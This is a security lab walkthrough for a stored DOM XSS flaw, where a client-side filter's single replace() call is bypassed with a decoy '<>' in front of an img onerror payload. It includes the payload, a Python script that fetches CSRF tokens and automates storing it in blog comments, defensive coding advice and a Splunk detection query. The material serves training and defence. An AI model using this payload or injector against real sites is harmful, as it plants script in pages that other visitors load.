
# Lab Walkthrough: Stored DOM XSS

* **Vulnerability Type:** Stored DOM-Based Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript (`innerHTML` Sink via Flawed Sanitization)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [JavaScript Sanitization Mechanisms Comparison](#4-javascript-sanitization-mechanisms-comparison)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

Stored DOM XSS occurs when an application stores user input on the server (e.g., in a database) but processes that data unsafely on the client side upon retrieval. 

* **The Core Flaw:** The developers attempted to sanitize HTML tags on the client side using the JavaScript `replace()` function before rendering the comment into the DOM. However, when a static string is passed as the first argument to `String.prototype.replace()`, it only targets the **first occurrence** of that string, leaving all subsequent instances intact.
* **The Sink:** The partially sanitized string is then passed into a dangerous DOM sink, such as `element.innerHTML`, which executes the remaining unsanitized HTML/JavaScript.
* **Real-World Analogy:** Imagine a security checkpoint where the guard is given a strict order: "Confiscate a weapon from the suspect." An attacker walks in holding a plastic toy sword in their left hand and a loaded firearm in their right. The guard takes the toy sword, considers the instruction fulfilled, and allows the attacker through with the firearm.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   STORED DOM XSS (REPLACE BYPASS)                      │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Payload Stored in DB] 
  <><img src=1 onerror=alert(1)>
           │
           ▼
  [2. Victim Browser Fetches Comment]
  AJAX request retrieves the raw payload from the server backend.
           │
           ▼
  [3. Client-Side Sanitization Flaw]
  code: comment.replace('<', '&lt;').replace('>', '&gt;')
  
  Execution:
  Target 1: `<>` (The decoy) -> Becomes `&lt;&gt;`
  Target 2: `<img...>` (The weapon) -> Left completely untouched.
           │
           ▼
  [4. Sink Execution]
  element.innerHTML = "&lt;&gt;<img src=1 onerror=alert(1)>"
  Browser fails to load src=1 and executes the onerror handler.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The blog post comment submission form.
* **Primary Objective:** Exploit the flawed client-side string replacement logic to inject an HTML tag that executes the `alert()` function whenever a user views the post.
* **Validation Signal:** The lab is marked solved when the payload is successfully stored and the `alert(1)` pop-up triggers upon page load.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Behavior Mapping

* Navigate to any blog post and submit a standard test comment containing HTML tags (e.g., `<h1>Test</h1>`).
* Open the browser's Developer Tools (F12) and inspect the DOM where your comment rendered.
* *Observation:* The output renders as `&lt;h1>Test&lt;/h1>`. Only the *first* opening and closing angle brackets were encoded. The subsequent brackets remained raw.

### Phase 2: Code Review (Client-Side)

* Check the JavaScript files handling the comment rendering (often found in the Network tab or Sources tab).
* You will likely find a flawed sanitization routine resembling:
```javascript
function escapeHTML(str) {
    return str.replace('<', '&lt;').replace('>', '&gt;');
}

```



### Phase 3: Payload Construction & Evasion

* Because the `replace()` function only consumes the first `<` and `>`, you must construct a payload that sacrifices a benign set of brackets to shield the malicious payload.
* **Decoy:** `<>`
* **Weapon:** `<img src=1 onerror=alert(1)>`
* **Combined Payload:** `<><img src=1 onerror=alert(1)>`

### Phase 4: Execution

* Submit the combined payload into the comment body.
* Refresh the page or navigate back to the blog post.
* *Result:* The JavaScript replaces the decoy brackets. The DOM parser receives `&lt;&gt;<img src=1 onerror=alert(1)>`. The browser attempts to load the invalid image source, fails, and triggers the `alert(1)` payload.

---

## 4. JavaScript Sanitization Mechanisms Comparison

Understanding how JavaScript handles string replacement is critical for identifying bypasses during source code reviews.

| JS Method | Behavior | Security Implication |
| --- | --- | --- |
| `str.replace('<', '&lt;')` | Replaces ONLY the first occurrence. | **Highly Vulnerable.** Attackers can prepend decoys to bypass. |
| `str.replace(/</g, '&lt;')` | Replaces ALL occurrences (Global Regex). | **Secure.** (If all dangerous characters are covered). |
| `str.replaceAll('<', '&lt;')` | Replaces ALL occurrences (ES2021+). | **Secure.** Modern standard for global string replacement. |

---

## 5. Automated Exploitation Script (Python PoC)

In a real-world assessment, attackers might automate payload injection across multiple blog posts or input fields to maximize victim exposure.

```python
#!/usr/bin/env python3
"""
Stored DOM XSS Injector (PoC)
Automates the submission of a decoy-shielded XSS payload to a blog post.
"""

import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def inject_stored_xss(target_url, post_id):
    session = requests.Session()
    
    # 1. Fetch the CSRF token required for comment submission
    print(f"[*] Fetching CSRF token from post ID: {post_id}...")
    response = session.get(f"{target_url}/post?postId={post_id}", verify=False)
    
    csrf_match = re.search(r'name="csrf" value="([a-zA-Z0-9_-]+)"', response.text)
    if not csrf_match:
        print("[-] Could not find CSRF token. Exiting.")
        sys.exit(1)
        
    csrf_token = csrf_match.group(1)
    print(f"[+] CSRF Token acquired: {csrf_token}")
    
    # 2. Construct and deliver the payload
    # Payload sacrifices the first '<>' to bypass the flawed JS replace()
    payload = "<><img src=1 onerror=alert(1)>"
    
    data = {
        'csrf': csrf_token,
        'postId': post_id,
        'comment': payload,
        'name': 'SecurityAuditor',
        'email': 'auditor@example.com',
        'website': ''
    }
    
    print(f"[*] Injecting payload: {payload}")
    post_url = f"{target_url}/post/comment"
    injection_resp = session.post(post_url, data=data, verify=False)
    
    if injection_resp.status_code == 200 or injection_resp.status_code == 302:
        print("[+] Payload successfully stored in the database.")
        print(f"[*] Trigger the exploit by visiting: {target_url}/post?postId={post_id}")
    else:
        print(f"[-] Injection failed. HTTP Status: {injection_resp.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 stored_dom_xss.py <TARGET_URL> <POST_ID>")
        sys.exit(1)
        
    inject_stored_xss(sys.argv[1].rstrip('/'), sys.argv[2])

```

---

## 6. Defense, Hardening & Secure Coding

Client-side sanitization is notoriously difficult to implement securely. The primary defense strategy should rely on eliminating dangerous sinks.

* **Use Safe Sinks (Primary Defense):** Never use `innerHTML` to render untrusted text. Use `textContent` or `innerText` instead. These properties inherently treat all input as raw text, making HTML parsing impossible regardless of sanitization flaws.
* *Vulnerable:* `commentElement.innerHTML = escapeHTML(userInput);`
* *Secure:* `commentElement.textContent = userInput;`


* **Secure Regex Replacement:** If HTML injection is a business requirement (e.g., allowing specific formatting tags) and client-side sanitization is unavoidable, use well-tested libraries like `DOMPurify`. If writing custom regex, always use the global flag (`/g`) or `.replaceAll()`.
* **Server-Side Sanitization:** Do not rely exclusively on the client to sanitize data. The backend server should heavily sanitize or HTML-encode the data *before* it is ever written to the database.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting Stored XSS requires monitoring inbound HTTP POST traffic for payload signatures, as the execution happens entirely offline in the victim's browser.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined method=POST uri_path="/post/comment"
| eval decoded_comment=urldecode(comment)
| search decoded_comment="*<>*" OR decoded_comment="*onerror*" OR decoded_comment="*<script>*"
| stats count by src_ip, decoded_comment, uri_path
| where count > 0

```

*Indicator of Attack (IoA):* Unusually formatted HTML strings, specifically redundant opening tags (`<><img`, `<<script>`), are highly indicative of an attacker attempting to bypass poorly implemented string replacement filters.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload renders as raw text (No alert)** | Server-side sanitization. | The backend may be encoding the data before storage. If the DOM reads `&lt;&gt;&lt;img...`, the client-side flaw is mitigated by backend security. |
| **Image broken icon appears, but no alert fires** | Content Security Policy (CSP). | The application may deploy a CSP that blocks inline scripts (`unsafe-inline`). The image fails to load, but the browser refuses to execute the `onerror` handler. |
| **Console Error: `Uncaught TypeError: replace is not a function**` | Data type mismatch. | The JavaScript is expecting a string but received a different object type (e.g., parsing a JSON object directly). |

---

> **Key Insight:** Developers frequently conflate standard string replacement with global sanitization. In JavaScript, `replace()` without a global regex flag acts as a single-use operation. This creates a critical logical vulnerability where an attacker can simply "feed" the filter a harmless decoy string to exhaust its singular execution, leaving the actual malicious payload completely unfettered.
